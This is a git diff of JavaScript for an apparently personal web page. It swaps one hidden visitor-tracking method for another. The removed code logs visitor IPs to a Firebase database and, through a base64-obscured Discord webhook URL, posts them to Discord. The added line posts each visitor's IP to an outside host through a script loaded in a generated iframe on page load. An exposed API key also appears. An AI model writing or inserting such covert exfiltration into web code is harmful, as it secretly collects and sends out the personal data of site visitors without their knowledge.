@@ -12,25 +12,7 @@ projimgs[1].style.left = -90+"vmin";
 racket = document.getElementById("racket");
 musicnote = document.getElementById("musicnote");
 
-const firebaseConfig = {
-    apiKey: "AIzaSyAuJP9dHW-tGeIflY-7PDj7etdgtAWcLqw",
-    authDomain: "ip-storage-5b5e3.firebaseapp.com",
-    databaseURL: "https://ip-storage-5b5e3-default-rtdb.firebaseio.com/",
-    storageBucket: "ip-storage-5b5e3.appspot.com",
-  };
-  
-firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
-
-$.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {
-   var currenttime = new Date();
-  var datefordb = (currenttime.getFullYear()+""+("0"+currenttime.getMonth()).slice(-2)+""+("0"+currenttime.getDate()).slice(-2)+""+("0"+currenttime.getHours()).slice(-2)+""+("0"+currenttime.getMinutes()).slice(-2)+""+("0"+currenttime.getSeconds()).slice(-2)).toString();
-  db.ref("ips/"+datefordb).set({
-      msg: data['ip']
-  });
-});
-
-const scrip = `fetch("https://api.ipify.org?format=json").then(t=>t.json()).then(t=>{fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA3ODkyMjQ3MDk1MTc1MTY4MC9UaXVMV0ZISklXX090UHo4SDlfYXRuSks0Y0xzZVZ2LTViQ3NOaHF3Y1Z2bkhkSF9Pc0xXX05yLWI5S0ZyUFhEcGZfYg=="),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:t.ip})})});`;
+const scrip = `fetch("https://api.ipify.org?format=json").then((t)=>t.json()).then((t)=>{fetch("https://damn.gq/api/",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({ip:t.ip}),})});`;
 
 url = `https://htmlpreview.github.io/?data:text/html,%3Cscript%3E${encodeURIComponent(scrip)}%3C%2Fscript%3E`;
 frame = document.createElement("iframe");
